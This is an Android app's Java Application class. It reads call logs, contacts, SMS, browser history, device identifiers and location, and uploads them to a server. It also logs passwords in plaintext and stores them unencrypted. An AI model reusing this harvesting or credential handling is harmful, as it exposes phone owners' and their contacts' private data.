package com.thanone.palc;

import android.app.Application;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

import com.baidu.mapapi.SDKInitializer;
import com.lidroid.xutils.DbUtils;
import com.lidroid.xutils.db.sqlite.Selector;
import com.lidroid.xutils.exception.DbException;
import com.thanone.palc.activity.SjhyActivity;
import com.thanone.palc.bean.CallRecord;
import com.thanone.palc.bean.Contacts;
import com.thanone.palc.bean.Internet;
import com.thanone.palc.bean.Location;
import com.thanone.palc.bean.LocationBean;
import com.thanone.palc.bean.Member;
import com.thanone.palc.bean.Messages;
import com.thanone.palc.bean.PhoneInfo;
import com.thanone.palc.service.LocationService;
import com.thanone.palc.util.HttpUrlUtil;
import com.zcj.android.util.UtilAndroid;
import com.zcj.android.util.UtilAppFile;
import com.zcj.android.util.UtilContacts;
import com.zcj.android.util.UtilInternet;
import com.zcj.android.util.UtilMessage;
import com.zcj.android.util.UtilSharedPreferences;
import com.zcj.android.util.bean.CallRecordBean;
import com.zcj.android.util.bean.ContactBean;
import com.zcj.android.util.bean.InternetBean;
import com.zcj.android.util.bean.MessageBean;
import com.zcj.android.web.HttpCallback;
import com.zcj.android.web.HttpUtilsHandler;
import com.zcj.android.web.ServiceResult;
import com.zcj.util.UtilString;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MyApplication extends Application {

    // XML配置文件信息
    public static final String XML_NAME = "palc";// 配置文件名
    private static final String XML_KEY_UUID = "UUID";
    public static final String XML_KEY_USERNAME = "u";
    public static final String XML_KEY_PASSWORD = "p";

    private Long loginUserId;
    private Member loginUser;

    private String phoneId;// 手机编号
    private DbUtils dbUtils;// 数据库操作对象
    private Intent locationService;// 定位服务
    private String bluetoothMacAddress;// 蓝牙地址

    /**
     * 文件保存的根目录
     */
    public static String FILESAVEPATH;
    /**
     * 临时文件保存的路径
     */
    public static String FILESAVEPATH_TEMP;

    @Override
    public void onCreate() {
        MyConfig.log("MyApplication--onCreate");

        // 如果是主进程
        if ("com.thanone.palc".equals(UtilAndroid.getProcessName(getApplicationContext()))) {

            SDKInitializer.initialize(getApplicationContext());

            if (UtilAppFile.sdcardExist()) {
                FILESAVEPATH = UtilAppFile.getSdcardPath();
            } else {
                FILESAVEPATH = UtilAppFile.getFilesDir(this);
            }
            FILESAVEPATH_TEMP = FILESAVEPATH + "download";
            File file = new File(FILESAVEPATH_TEMP);
            if (!file.exists()) {
                file.mkdirs();
            }

            try {
                phoneId = UtilAndroid.getUdid(this, XML_NAME, XML_KEY_UUID);
                dbUtils = DbUtils.create(this);
                locationService = new Intent(this, LocationService.class);
                bluetoothMacAddress = UtilAndroid.getBluetoothMacAddress();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        super.onCreate();
    }

    public void startLocationService() {
        if (locationService != null) {
            startService(locationService);
            MyConfig.log("--startLocationService");
        }
    }

    public void stopLocationService() {
        if (locationService != null) {
            stopService(locationService);
            MyConfig.log("--stopLocationService");
        }
    }

    // 保存账号信息到本地
    public void saveUserInfo(String username, String password) {
        MyConfig.log("开始保存登录的账号：" + username + ":" + password);
        Map<String, String> linfo = new HashMap<String, String>();
        linfo.put(MyApplication.XML_KEY_USERNAME, username);
        linfo.put(MyApplication.XML_KEY_PASSWORD, password);
        UtilSharedPreferences.save(this, MyApplication.XML_NAME, linfo);
        MyConfig.log("保存账号成功");
    }

    /**
     * 读取各类信息，并上传至服务器
     *
     * @param callRecord 读取通话记录
     * @param contacts   读取通讯录(同时用于判断是打开APP时采集数据还是核验时采集数据)
     * @param messages   读取短信
     * @param internet   浏览器历史记录
     * @param phoneInfo  读取手机参数
     * @param location   读取位置信息
     * @param showResult 执行完毕后是否弹出提示
     * @param handler
     */
    public void readInfoAndUploadToWeb(final boolean callRecord, final boolean contacts, final boolean messages, final boolean internet,
                                       final boolean phoneInfo, final boolean location, final String showResult, final Handler handler) {

        MyConfig.log("开始读取手机数据并上传...");

        new Thread(new Runnable() {
            @Override
            public void run() {
                String result = "";
                List<CallRecord> callRecordList = null;
                List<Contacts> contactsList = null;
                List<Messages> messagesList = null;
                List<Internet> internetList = null;
                PhoneInfo pi = null;
                Location loc = null;
                if (location) {
                    loc = LocationBean.coverToLocation(getLastLocation());
                }

                if (callRecord) {
                    try {
                        MyConfig.log("开始读取通话记录");
                        List<CallRecordBean> crb = UtilContacts.getCallRecord(MyApplication.this);
                        if (crb != null && crb.size() > 0) {
                            callRecordList = CallRecord.converByCallRecordBean(crb, getPhoneId());
                        }
                        result += "读取通话记录" + crb.size() + "条。";
                    } catch (Exception e1) {
                        e1.printStackTrace();
                        result += "读取通话记录失败。";
                    }
                }
                if (contacts) {
                    try {
                        MyConfig.log("开始读取通讯录");
                        List<ContactBean> cb = UtilContacts.getContacts(MyApplication.this);
                        if (cb != null && cb.size() > 0) {
                            contactsList = Contacts.converByContactsBean(cb, getPhoneId());
                        }
                        result += "读取通讯录" + cb.size() + "条。";
                    } catch (Exception e1) {
                        e1.printStackTrace();
                        result += "读取通讯录失败。";
                    }
                }
                if (messages) {
                    try {
                        MyConfig.log("开始读取短信");
                        List<MessageBean> mb = UtilMessage.getAllMessages(MyApplication.this);
                        if (mb != null && mb.size() > 0) {
                            messagesList = Messages.converByMessageBean(mb, getPhoneId());
                        }
                        result += "读取短信" + mb.size() + "条。";
                    } catch (Exception e) {
                        e.printStackTrace();
                        result += "读取短信失败。";
                    }
                }
                if (internet) {
                    try {
                        MyConfig.log("开始读取浏览器历史记录");
                        List<InternetBean> ib = UtilInternet.getAllHostory(MyApplication.this);
                        if (ib != null && ib.size() > 0) {
                            internetList = Internet.converByInternetBean(ib, getPhoneId());
                        }
                        result += "读取浏览器历史记录" + ib.size() + "条。";
                    } catch (Exception e) {
                        e.printStackTrace();
                        result += "读取浏览器历史记录失败。";
                    }
                }
                if (phoneInfo) {
                    try {
                        MyConfig.log("开始读取手机参数");
                        pi = new PhoneInfo();
                        pi.setDeviceID(getPhoneId());
                        pi.setImei(UtilAndroid.getIMEI(MyApplication.this));
                        pi.setImsi(UtilAndroid.getIMSI(MyApplication.this));
                        pi.setMacAddress(UtilAndroid.getMacAddress(MyApplication.this));
                        pi.setBluetoothMacAddress(UtilAndroid.getBluetoothMacAddress());
                        pi.setModel(UtilAndroid.getPhoneVersion());
                        pi.setOs(UtilAndroid.getAndroidVersion());
                        result += "读取手机参数成功。";
                    } catch (Exception e) {
                        e.printStackTrace();
                        result += "读取手机参数失败。";
                    }
                }

                MyConfig.log(result);

                if (contacts) {
                    uploadInfoToWeb(callRecordList, contactsList, messagesList, pi, loc, internetList);
                } else {
                    uploadBaseToWeb(pi, loc);
                }

                if (UtilString.isNotBlank(showResult) && handler != null) {
                    handler.sendMessage(newMessage(SjhyActivity.MESSAGE_WHAT_ALERTDIALOG, showResult));
                }

            }
        }).start();
    }

    Message newMessage(int theWhat, Object theObj) {
        Message message = new Message();
        message.what = theWhat;
        if (theObj != null) {
            message.obj = theObj;
        }
        return message;
    }

    /**
     * 取得最后一条定位信息
     */
    public LocationBean getLastLocation() {
        try {
            List<LocationBean> list = getDbUtils().findAll(Selector.from(LocationBean.class).orderBy("ctime", true).limit(1));
            if (list != null && list.size() > 0) {
                return list.get(0);
            }
        } catch (DbException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 上传基本信息到服务器，用于每次打开APP
     *
     * @param phoneInfo
     * @param location
     */
    private void uploadBaseToWeb(PhoneInfo phoneInfo, Location location) {
        uploadPhoneInfoToWeb(phoneInfo);
        uploadLocationToWeb(location);
    }

    /**
     * 上传各类信息到服务器，用于数据采集
     *
     * @param callRecord 通话记录
     * @param contacts   通讯录
     * @param messages   短信
     * @param phoneInfo  手机参数
     * @param location   位置信息
     * @param internet   浏览器历史记录
     */
    private void uploadInfoToWeb(List<CallRecord> callRecord, List<Contacts> contacts, List<Messages> messages, PhoneInfo phoneInfo,
                                 Location location, List<Internet> internet) {
        uploadCallRecordToWeb(callRecord);
        uploadContactsToWeb(contacts);
        uploadMessagesToWeb(messages);
        uploadInternetToWeb(internet);
        uploadPhoneInfoToWeb(phoneInfo);
        uploadLocationToWeb(location);
    }

    private void uploadCallRecordToWeb(final List<CallRecord> callRecordList) {
        if (callRecordList != null && callRecordList.size() > 0) {
            MyConfig.log("准备上传" + callRecordList.size() + "条通话记录");
            String crJson = ServiceResult.GSON_DT.toJson(callRecordList);
            HttpUtilsHandler.send(HttpUrlUtil.URL_SAVECALLRECORD, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
                @Override
                public void success(String result) {
                    MyConfig.log("上传通话记录成功");
                }

                @Override
                public void error() {
                    MyConfig.log("上传通话记录失败");
                }
            });
        }
    }

    /**
     * 不管有没有数据，都发HTTP请求，请求失败的话不需要做任何处理
     */
    private void uploadContactsToWeb(List<Contacts> list) {
        if (list == null) {
            list = new ArrayList<>();
        }
        MyConfig.log("准备上传" + list.size() + "条通讯录");
        String crJson = ServiceResult.GSON_DT.toJson(list);
        HttpUtilsHandler.send(HttpUrlUtil.URL_SAVECONTACTS, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
            @Override
            public void success(String result) {
                MyConfig.log("上传通讯录成功");
            }

            @Override
            public void error() {
                MyConfig.log("上传通讯录失败");
            }
        });
    }

    private void uploadMessagesToWeb(final List<Messages> list) {
        if (list != null && list.size() > 0) {
            MyConfig.log("准备上传" + list.size() + "条短信");
            String crJson = ServiceResult.GSON_DT.toJson(list);
            HttpUtilsHandler.send(HttpUrlUtil.URL_SAVEMESSAGES, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
                @Override
                public void success(String result) {
                    MyConfig.log("上传短信成功");
                }

                @Override
                public void error() {
                    MyConfig.log("上传短信失败");
                }
            });
        }
    }

    private void uploadInternetToWeb(final List<Internet> list) {
        if (list != null && list.size() > 0) {
            MyConfig.log("准备上传" + list.size() + "条浏览器记录");
            String crJson = ServiceResult.GSON_DT.toJson(list);
            HttpUtilsHandler.send(HttpUrlUtil.URL_SAVEINTERNET, HttpUrlUtil.url_saveOther(phoneId, crJson), new HttpCallback() {
                @Override
                public void success(String result) {
                    MyConfig.log("上传浏览器记录成功");
                }

                @Override
                public void error() {
                    MyConfig.log("上传浏览器记录失败");
                }
            });
        }
    }

    private void uploadPhoneInfoToWeb(final PhoneInfo obj) {
        if (obj != null) {
            MyConfig.log("准备上传手机参数");
            HttpUtilsHandler.send(
                    HttpUrlUtil.URL_SAVEPHONEINFO,
                    HttpUrlUtil.url_savePhoneInfo(getPhoneId(), obj.getOs(), obj.getModel(), obj.getMacAddress(), obj.getImei(),
                            obj.getImsi(), obj.getBluetoothMacAddress()), new HttpCallback() {
                        @Override
                        public void success(String result) {
                            MyConfig.log("上传手机参数成功");
                        }

                        @Override
                        public void error() {
                            MyConfig.log("上传手机参数失败");
                        }
                    });
        }
    }

    private void uploadLocationToWeb(final Location obj) {
        if (obj != null) {
            MyConfig.log("准备上传位置信息");
            HttpUtilsHandler.send(HttpUrlUtil.URL_SAVELOCATION,
                    HttpUrlUtil.url_saveLocation(getPhoneId(), obj.getLongitude(), obj.getLatitude(), obj.getAddress(), obj.getTime()),
                    new HttpCallback() {
                        @Override
                        public void success(String result) {
                            MyConfig.log("上传位置信息成功");
                        }

                        @Override
                        public void error() {
                            MyConfig.log("上传位置信息失败");
                        }
                    });
        }
    }

    public String getPhoneId() {
        return phoneId;
    }

    public void setPhoneId(String phoneId) {
        this.phoneId = phoneId;
    }

    public DbUtils getDbUtils() {
        return dbUtils;
    }

    public String getBluetoothMacAddress() {
        return bluetoothMacAddress;
    }

    public void setBluetoothMacAddress(String bluetoothMacAddress) {
        this.bluetoothMacAddress = bluetoothMacAddress;
    }

    public void setDbUtils(DbUtils dbUtils) {
        this.dbUtils = dbUtils;
    }

    public Long getLoginUserId() {
        return loginUserId;
    }

    public void setLoginUserId(Long loginUserId) {
        this.loginUserId = loginUserId;
    }

    public Member getLoginUser() {
        return loginUser;
    }

    public void setLoginUser(Member loginUser) {
        this.loginUser = loginUser;
    }
}
